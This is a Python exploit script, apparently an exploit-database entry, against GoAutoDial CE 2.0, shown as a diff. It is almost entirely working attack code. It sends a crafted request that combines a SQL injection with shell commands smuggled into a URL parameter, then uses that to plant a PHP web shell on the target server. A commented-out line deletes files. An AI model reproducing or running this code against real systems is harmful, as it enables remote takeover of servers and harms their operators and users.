@@ -1,0 +1,58 @@
+# Title : GoAutoDial CE 2.0 Shell Upload
+# Date : 28/02/2015 
+# Author : R-73eN
+# Software : GoAutoDial CE 2.0
+# Tested : On Linux vicisrv.loc 2.6.18-238.9.1.el5.goPAE #1  GoAutoDial CE 2.0
+
+import socket
+import sys
+banner = "\n\n"
+banner +="  ___        __        ____                 _    _  \n"  
+banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
+banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
+banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
+banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
+print banner
+CRLF = "\r\n"
+def checkvuln():
+	command = "uname"
+	evil = path + '/manager_send.php?enable_sipsak_messages=1&allow_sipsak_messages=1&protocol=sip&ACTION=OriginateVDRelogin&session_name=AAAAAAAAAAAA&server_ip=%27%20OR%20%271%27%20%3D%20%271&extension=%3B' + command + '%3B&user=' + user + '&pass=' + password
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect((host,80))
+	evilREQ = 'GET ' + evil + ' HTTP/1.1' + CRLF + 'Host: ' + host + CRLF + 'User-Agent: Infogen-AL' + CRLF + CRLF + CRLF
+	s.send(evilREQ)
+	a = s.recv(1024)
+	if(a.find("HTTP/1.1 200 OK") != -1 and a.find("Linux") != -1):
+		print '[ + ] Server Is vulnerable [ + ]\n'
+		shellupload()
+	else: 
+		print '[ - ] Server is not vulnerable [ - ]\n'
+	s.close()
+
+
+def shellupload():
+	command = "echo 'Infogen-AL<br><?php echo system($_GET['cmd']);?>' > /var/www/html/infogen.php"
+	#command = "rm /var/www/html/123.pl;rm /var/www/html/TEST.perl"
+	command = command.replace(" ", "%20")
+	evil = path + '/manager_send.php?enable_sipsak_messages=1&allow_sipsak_messages=1&protocol=sip&ACTION=OriginateVDRelogin&session_name=AAAAAAAAAAAA&server_ip=%27%20OR%20%271%27%20%3D%20%271&extension=%3B' + command + '%3B&user=' + user + '&pass=' + password
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect((host,80))
+	evilREQ = 'GET ' + evil + ' HTTP/1.1' + CRLF + 'Host: ' + host + CRLF + 'User-Agent: Infogen-AL' + CRLF + CRLF + CRLF
+	s.send(evilREQ)
+	a = s.recv(1024)
+	if(a.find("HTTP/1.1 200 OK") != -1 and a.find("Invalid") == -1):
+		print '[ + ] Shell uploaded successfully [ + ]\n'
+		print '[ + ] http://' + host + '/infogen.php [ + ]\n'
+	else:
+		print '[ - ] Shell upload failed.... [ - ]'
+	s.close()
+
+if(len(sys.argv) < 4):
+	print '\n Usage : exploit.py 127.0.0.1 /goautodial-agent/ agentuser agentpassword\n'
+else:
+	host = sys.argv[1]
+	path = sys.argv[2]
+	user = sys.argv[3]
+	password = sys.argv[4]
+	checkvuln()
+	print 'Visit Us : http://infogen.al/'
